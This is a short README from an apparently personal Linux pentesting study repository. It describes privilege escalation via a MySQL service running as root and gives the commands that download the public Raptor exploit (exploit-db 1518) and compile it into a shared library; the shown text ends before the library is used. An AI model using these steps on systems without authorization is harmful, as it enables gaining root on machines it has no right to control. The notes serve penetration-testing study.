# Linux-Pentest
A repository to store some linux exploitation and technique i've seen during my studies

# List of contents:
- [Privilege Escalation](#Linux-Privesc)

## Linux Privesc:
### Privesc via mysql admin
If the mysql service is running as root we can use a popular exploit to execute commands:
We will use [Raptor exploit](https://www.exploit-db.com/exploits/1518) that we will compile on our local machine as follow.
```bash
curl https://www.exploit-db.com/download/1518 -o raptor.c
gcc -g -c raptor.c -fPIC
gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc
```
